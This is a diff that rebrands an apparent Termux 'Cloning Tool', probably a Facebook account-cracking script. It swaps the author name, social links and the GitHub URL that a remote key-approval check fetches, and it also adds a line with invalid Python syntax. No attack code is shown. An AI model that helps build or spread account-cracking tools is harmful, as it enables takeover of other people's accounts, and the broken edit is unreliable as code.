@@ -55,11 +55,11 @@ _  / / /__  ___/  __/  __ `/  __ `/  __  /    ___ _  /__  /| |_  /| |_   |/ /__ 
                                                                                         
                
  ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m USTAAD JANII YT\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m SUHBAT JANII YT\x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
  ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   :Ustaad Janii \x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Ustaad-Janii-xd \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   :Suhbat Janii \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Suhhbat/KING--xd \x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./UstaadJanii\x1b[0m\x1b[1;97m]
 ───────────────────────────────────────────────────────× 
  """)
@@ -75,9 +75,9 @@ os.system('termux-setup-storage')
 def helpnote():
 	print("%s [=>] FOLLOW ME ON  FB TU KNOW ABOUT UPDATES  :)"%(G))
 	#yahan nichy httsp sy hata kr apna github aproval link dalna
-	subprocess.check_output(["am", "start", "https://github.com/ustaadjanii/run.txt/blob/main/run.txt"])
+	subprocess.check_output(["am", "start", "https://github.com/Suhhbat/KING-/blob/main/Janii.py"])
 	#yahan apni facebook id link dalna
-	exit(" [=>] FACEBOOK :  https://www.facebook.com/ustaadjanii")
+	exit(" [=>] FACEBOOK :  https://www.facebook.com/sonujan.abro?mibextid=ZbWKwL")
 
 
 def notice():
@@ -86,7 +86,7 @@ def notice():
 
 	runtxt("\n\033[0;97m   Tool For Aproval Join Group ")
 	os.system("xdg-open https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl")
-	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(G,basesplit))
+	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(https://chat.whatsapp.com/EvhN1de3Mk6Jbxr3Q1sIuZ))
 	runtxt("\033[0;97m Key group admin ke post pe coment krein")
 	os.system("xdg-open https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl")
 	subprocess.check_output(["am", "start", "https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl"])
@@ -111,7 +111,7 @@ class Main:
 		self.loop = 0
 		try:
 			#yahan pr v apna github link dalna aproval wala
-			plr = requests.get('https://github.com/Mr-Qureshi-xd/run.txt/blob/main/run.txt').text
+			plr = requests.get('https://github.com/Suhhbat/KING-/blob/main/Janii.py').text
 			if basesplit in plr:
 				key = basesplit
 				stat = ("\033[0;97mPREMIUM")
@@ -140,11 +140,11 @@ _  / / /__  ___/  __/  __ `/  __ `/  __  /    ___ _  /__  /| |_  /| |_   |/ /__ 
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
  ───────────────────────────────────────────────────────×
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   :Ustaad Janii \x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Qureshi-xd \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Suhhbat/KING-]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./UstaadJanii\x1b[0m\x1b[1;97m]
 ───────────────────────────────────────────────────────× 
     """)
-		print("%s [%s•%s] %sTOOL NAME : %sCloning Tool"%(G,R,G,B,G))
+		print("%s [%s•%s] %sTOOL NAME : %sKING"%(G,R,G,B,G))
 		print("%s [%s•%s] %sVERSION   : %s6"%(G,R,G,B,G))
 		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
 		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
@@ -396,8 +396,8 @@ _  / / /__  ___/  __/  __ `/  __ `/  __  /    ___ _  /__  /| |_  /| |_   |/ /__ 
 if len(sys.argv) == 2:
 	if sys.argv[1] == "--info":
 		print("")
-		print("\n [*] Author    :  ")
-		print(" [*] Team      :  \n")
+		print("\n [*] Author  SUHBAT  :  ")
+		print(" [*] Team  SUHBAT    :  \n")
 		print(" [ Sosial Medi  ] \n")
 		print(" [*] Facebook  : https://facebook.com/ ")
 		print(" [*] Instagram : https://instagram.com/ ")
